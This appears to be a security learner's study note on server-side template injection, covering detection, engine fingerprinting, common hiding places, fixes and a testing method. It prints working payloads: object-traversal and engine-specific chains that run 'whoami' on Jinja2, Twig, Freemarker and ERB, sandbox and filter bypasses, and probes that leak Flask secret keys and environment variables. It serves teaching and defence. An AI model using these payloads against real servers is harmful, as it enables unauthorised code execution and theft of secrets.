# Server-Side Template Injection (SSTI)
Tags: #vulnerability #ssti #injection #rce #day5

## What is SSTI and why does it exist?

Template engines let developers write a page layout once with placeholders, then fill in dynamic data per user. `<h1>Welcome, {{username}}</h1>` becomes "Welcome, John" for one user and "Welcome, Sarah" for another. Jinja2 (Python), Twig (PHP), Freemarker (Java), ERB (Ruby), Nunjucks (Node.js) — all do this.

SSTI happens when user input is concatenated into the template string itself instead of passed as data. Same root cause as SQLi — user input mixed into a structured language instead of kept separate.

```python
# Safe — user input passed as data. Template engine knows it's a value to display.
render("<h1>Welcome, {{username}}</h1>", username=user_input)

# Vulnerable — user input concatenated into the template. Engine treats it as code.
render("<h1>Welcome, " + user_input + "</h1>")
```

If the attacker submits `{{7*7}}` as their name and the page displays "Welcome, 49" — the template engine evaluated the expression. That confirms SSTI.

## Why is SSTI almost always critical severity?

Template engines aren't just replacing variables. They support loops, conditionals, method calls, object property access, and filters — giving templates access to the underlying programming language's objects and methods.

In Jinja2, the attacker can traverse Python's object hierarchy to reach dangerous classes:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Start with an empty string → access its class → walk up the inheritance tree to Python's base `object` class → list all loaded subclasses → find one that can execute system commands. From there:

```
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
```

That's remote code execution from a template injection. The attacker went from displaying a name on a page to running OS commands on the server with the application's privileges.

Unlike XSS which runs in the victim's browser, SSTI executes on the server. It's almost always a direct path to RCE.

## Why can't the attacker just do `{{import os}}`?

Template engines run in a sandbox. They deliberately restrict direct access to `import`, `open()`, `os`, and other dangerous built-ins. If they didn't, every template would be a security risk even without SSTI.

But the sandbox has holes. Everything in Python is an object, and objects are connected through class relationships. The attacker follows these connections — "you won't let me use the front door, so I'll climb through the window by following the chain of objects already available to me."

The severity depends on how powerful the template engine is:

| Engine | Language | Typical impact |
|---|---|---|
| Jinja2 | Python | RCE via object traversal |
| Twig | PHP | RCE via PHP functions |
| Freemarker | Java | RCE via `Runtime.exec()` |
| ERB | Ruby | RCE — `system()` directly accessible |
| Thymeleaf | Java | RCE via Spring EL |
| Mako | Python | RCE |
| Nunjucks | Node.js | RCE possible |
| Handlebars | JS | Usually no RCE — logic-less engine |
| Mustache | Multi | Usually no RCE — logic-less engine |

The more powerful the template engine, the more dangerous SSTI becomes.

## How do you fingerprint which template engine is running?

Each engine has different syntax. You use payloads that behave differently across engines — a decision tree:

**Step 1:** Submit `{{7*7}}` and `${7*7}`.

- `{{7*7}}` returns 49 → engine uses `{{ }}` syntax (Jinja2, Twig, Nunjucks)
- `${7*7}` returns 49 → likely Freemarker, Mako, or Expression Language
- `<%= 7*7 %>` returns 49 → ERB (Ruby)
- `#{7*7}` returns 49 → Thymeleaf (Java)

**Step 2:** Narrow down with engine-specific behavior.

If `{{7*7}}` worked, try `{{7*'7'}}`:
- Returns `7777777` → **Jinja2** (Python string multiplication)
- Returns `49` → **Twig** (PHP, treats as math)
- Error → try other probes

**Step 3:** Engine-specific functions.

- `{{config}}` returns Flask config → Jinja2 with Flask
- `{{_self.env.display("hello")}}` works → Twig
- `${"freemarker"}` returns "freemarker" → Freemarker
- `${T(java.lang.Runtime)}` returns object → Spring EL

The fingerprinting table:

| Syntax | Payload | Result | Engine |
|---|---|---|---|
| `{{ }}` | `{{7*7}}` | 49 | Jinja2, Twig, Nunjucks |
| `{{ }}` | `{{7*'7'}}` | 7777777 | Jinja2 (Python) |
| `{{ }}` | `{{7*'7'}}` | 49 | Twig (PHP) |
| `${ }` | `${7*7}` | 49 | Freemarker, Mako, EL |
| `<%= %>` | `<%= 7*7 %>` | 49 | ERB (Ruby) |
| `#{ }` | `#{7*7}` | 49 | Thymeleaf, Slim |
| `@( )` | `@(7*7)` | 49 | Razor (.NET) |

## How do you distinguish SSTI from client-side template injection?

`{{7*7}}` returning 49 might be client-side (Angular, Vue), not server-side. Check: view the page source. If `49` is in the raw HTML from the server, it's SSTI. If the source shows `{{7*7}}` and JavaScript evaluates it client-side, it's CSTI — different vulnerability, different impact (XSS-level, not RCE).

## Where does SSTI hide beyond obvious inputs?

**Custom email templates** — "Let users design their own notification emails." User creates `Dear {{customer_name}}`. Developer renders this user-created template with Jinja2. If the user submits `{{ config.SECRET_KEY }}`, it executes.

**CMS and page builders** — "Let admins create custom page layouts." The admin is writing templates. If any lower-privilege user can access this, they have SSTI.

**Error pages** — custom 404 page includes the requested URL: `render("Page " + request.path + " not found")`. The URL path is user-controlled and concatenated into a template.

**Internationalization/localization** — translation strings stored in a database get rendered through a template engine. If an attacker can modify translations (SQLi, admin access, CMS), they inject template code into every page.

**PDF/report generation** — server generates reports using templates. User-supplied data concatenated into the template instead of passed as data.

The fix is one line of code. Knowing where to apply it across a large application — that's the hard part.

## How do you fix SSTI?

**Pass user input as data, never as template code.** Same principle as parameterized queries for SQLi. The template structure is defined by the developer. User input only fills data slots. `{{7*7}}` gets displayed as literal text, not evaluated.

**Use logic-less template engines** (Mustache, Handlebars) when you don't need full template power. Less functionality = smaller attack surface = usually no RCE path.

**Sandbox hardening** — Jinja2 has `SandboxedEnvironment` that restricts access to `__class__`, `__subclasses__`, etc. Not bulletproof but adds a layer.

**Input validation** — if the input should be a name, reject anything containing `{{ }}`, `${ }`, `<% %>`, or other template syntax.

**Don't let users control templates at all** — if you must (email builders, CMS), use a logic-less engine with strict sandboxing.

## How do you test for SSTI step by step?

**1. Identify injection points.** Map every place user input gets reflected back on the page — form fields, URL parameters, headers, profile fields, email templates, CMS editors, error messages. Focus on features where output looks "rendered."

**2. Test with basic expressions.** Submit in every input:
- `{{7*7}}`
- `${7*7}`
- `<%= 7*7 %>`
- `#{7*7}`

If any return `49` instead of the literal string, the template engine evaluated the input.

**3. Distinguish from CSTI.** View page source — is `49` in the raw HTML (SSTI) or does JavaScript evaluate it client-side (CSTI)?

**4. Fingerprint the engine.** Use the decision tree and fingerprinting table above.

**5. Attempt information disclosure.** Before going for RCE, grab low-hanging fruit:

| Engine | Payload | What leaks |
|---|---|---|
| Jinja2 | `{{config}}` | Flask config, possibly `SECRET_KEY` |
| Jinja2 | `{{request.environ}}` | Server environment variables |
| Twig | `{{app.request.server.all}}` | Server variables |
| Freemarker | `${.data_model}` | Template data model |

**6. Escalate to RCE.** Engine-specific payloads:

| Engine | RCE payload |
|---|---|
| Jinja2 | `{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}` |
| Twig | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}` |
| Freemarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}` |
| ERB | `<%= system("whoami") %>` |

**7. Handle filtered/sandboxed environments.** If basic payloads are blocked:
- Jinja2 `attr()` filter: `{{ ''|attr('__class__') }}`
- String concatenation to bypass keyword filters: `{{ ''|attr('__cla'+'ss__') }}`
- `request` object if available: `{{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}`
- Build strings character by character with `chr()`

**8. Document and prove impact.** Show the full chain: injection → fingerprint → info disclosure → RCE. Demonstrate `whoami` output or read a non-sensitive file. Don't go further than proving impact.

## My Notes
